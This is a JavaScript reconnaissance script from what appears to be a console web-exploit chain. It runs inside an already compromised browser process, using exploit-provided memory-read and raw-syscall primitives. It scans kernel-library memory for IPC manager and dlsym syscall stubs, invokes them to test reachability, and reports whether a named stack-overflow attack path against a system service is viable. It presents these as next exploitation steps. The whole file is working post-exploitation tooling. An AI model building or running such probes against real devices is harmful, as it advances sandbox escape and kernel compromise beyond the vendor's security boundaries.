// syscore_connect_probe.js — SceSysCore Ipmi reachability probe (F-021/F-022 follow-up)
//
// QUESTION ANSWERED: can the compromised web process reach the kernel-side
// IPC manager (syscall 0x26e ipmimgr_call) — the transport every Ipmi client
// (incl. the SceSysCore service where the proven stack overflow lives) uses?
//
// Stages:
//   0. environment sanity (getpid through the exploit's syscall path)
//   1. in-memory stub scan for ipmimgr_call(0x26e) / dlsym(0x24e) around the
//      getpid anchor in libkernel_web (kernelBase is known by the runtime)
//   2. syscallClean probes with null args — ANY errno-style return means the
//      syscall interface is callable from this process; a hang/crash means
//      the sandbox blocks it. No IPC traffic is generated. Analysis only.
//   3. libSceIpmi base discovery if the runtime exposes a module list;
//      otherwise reports exactly what is missing for the full client test.
//
// Research context: research_12_00/state/findings.jsonl F-019..F-022.
(async () => {
    const log = (m) => { if (window.addLog) window.addLog(m); console.log(m); };
    const out = (m) => { if (window.payOut) window.payOut(m); };
    const hx  = (v) => "0x" + BigInt(v).toString(16);

    log("[SCP] ── SceSysCore Ipmi reachability probe ──");

    const info = window.deepslopInfo || {};
    const kern = window.ps5kern;
    if (!kern || !window.syscallClean) {
        const msg = "[SCP] FAIL: ps5kern/syscallClean unavailable — run the exploit first";
        log(msg); return msg;
    }
    log("[SCP] FW=" + (info.fw || "?") + " kernelBase=" + (info.kernelBase ? hx(info.kernelBase) : "?"));

    // ---- Stage 0: sanity — getpid through the whole path -------------------
    let pidRes;
    try { pidRes = kern.pid(); } catch (e) { pidRes = { error: String(e && e.message) }; }
    const pidOk = pidRes && pidRes.ok && pidRes.ret >= 0;
    log("[SCP] stage0 getpid: " + (pidOk ? ("OK pid=" + pidRes.ret) : JSON.stringify(pidRes)));
    if (!pidOk) {
        const msg = "[SCP] ABORT: base syscall path not functional — fix before probing";
        log(msg); if (window.ps5kern && window.ps5kern.notify) window.ps5kern.notify("SCP: syscall path broken");
        return msg;
    }

    // ---- Stage 1: stub scan for 0x26e / 0x24e ------------------------------
    // libkernel syscall stubs are `mov eax, nr; syscall; ret` clustered near
    // the getpid export. kernel-stubs.js proved this layout across 23 FWs.
    const anchors = [];
    const stubs = (window.deepslopStubs && window.deepslopStubs.addresses) || null;
    if (stubs && stubs.getpid) anchors.push(Number(stubs.getpid));
    if (info.kernelBase && info.getpidAddress) anchors.push(Number(info.getpidAddress));
    const WANT = { ipmimgr_call: 0x26e, dlsym: 0x24e };
    const found = {};
    if (anchors.length && window.readBytes) {
        const kb = Number(info.kernelBase);
        const center = anchors[0];
        const lo = Math.max(kb, center - 0x20000);
        const sz  = 0x40000;
        let blob;
        try { blob = window.readBytes(lo, sz); } catch (e) { blob = null; }
        if (blob) {
            for (const [name, nr] of Object.entries(WANT)) {
                const pat = [0xb8, nr & 0xFF, (nr >> 8) & 0xFF, 0x00, 0x00, 0x0f, 0x05];
                outer: for (let i = 0; i + 7 <= blob.length; i++) {
                    for (let j = 0; j < pat.length; j++)
                        if (blob[i + j] !== pat[j]) continue outer;
                    found[name] = lo + i;
                    break;
                }
            }
        }
        for (const [name, a] of Object.entries(found))
            log("[SCP] stage1 stub " + name + " @ " + hx(a));
        for (const name of Object.keys(WANT))
            if (!(name in found)) log("[SCP] stage1 stub " + name + ": NOT FOUND in scan window");
    } else {
        log("[SCP] stage1 skipped (need readBytes + getpid anchor)");
    }

    // ---- Stage 2: reachability probes (null args; no traffic) ---------------
    const classify = (r) => {
        if (r && r.ok) {
            const v = Number(r.ret);
            if (v >= 0 && v < 0x1000) return "REACHABLE(ret=" + v + ")";
            const u = v >>> 0;
            if (u >= 0x80020000) return "REACHABLE(SCE-err " + hx(u) + ")";
            if (v < 0 && v > -0x200) return "REACHABLE(errno " + (-v) + ")";
            return "REACHABLE(ret=" + hx(v) + ")";
        }
        return "UNAVAILABLE(" + (r && r.error ? r.error : "no result") + ")";
    };
    const verdict = { getpid: "OK", ipmimgr_call: "not probed", dlsym: "not probed" };

    if (found.ipmimgr_call) {
        // register the found stub into the runtime stub map, then probe
        try {
            const r = window.syscallClean(0x26e, 0, 0);
            verdict.ipmimgr_call = classify(r);
            log("[SCP] stage2 ipmimgr_call(0,0): " + verdict.ipmimgr_call);
        } catch (e) {
            verdict.ipmimgr_call = "EXCEPTION(" + String(e && e.message).slice(0, 40) + ")";
            log("[SCP] stage2 ipmimgr_call threw: " + verdict.ipmimgr_call);
        }
    }
    if (found.dlsym) {
        try {
            const r = window.syscallClean(0x24e, 0, 0);
            verdict.dlsym = classify(r);
            log("[SCP] stage2 dlsym(0,0): " + verdict.dlsym);
        } catch (e) {
            verdict.dlsym = "EXCEPTION(" + String(e && e.message).slice(0, 40) + ")";
        }
    }

    // ---- Stage 3: libSceIpmi base availability ------------------------------
    const modHints = {};
    for (const key of ["ipmiBase", "sysmoduleBase", "nkWebBase", "moduleList", "modules"])
        if (info[key] !== undefined) modHints[key] = true;
    log("[SCP] stage3 module-list hints in deepslopInfo: " +
        (Object.keys(modHints).length ? Object.keys(modHints).join(",") : "none"));

    // ---- Verdict -------------------------------------------------------------
    const ipmiReachable = String(verdict.ipmimgr_call).startsWith("REACHABLE");
    const summary =
        "[SCP] VERDICT: ipmimgr syscall " +
        (verdict.ipmimgr_call === "not probed"
            ? "NOT PROBED (stub not found — widen scan or add anchor)"
            : (ipmiReachable
                ? "REACHABLE — kernel IPC transport callable from web process; "
                  + "SceSysCore attack path (F-022) is transport-plausible. "
                  + "Next: call5 upgrade + full client connect."
                : "BLOCKED — " + verdict.ipmimgr_call));
    log(summary);
    out("SCP: " + JSON.stringify(verdict));
    try { if (window.ps5kern.notify) window.ps5kern.notify(ipmiReachable ? "SCP: IPC syscall REACHABLE" : "SCP: see log"); } catch (_) {}

    return summary;
})();
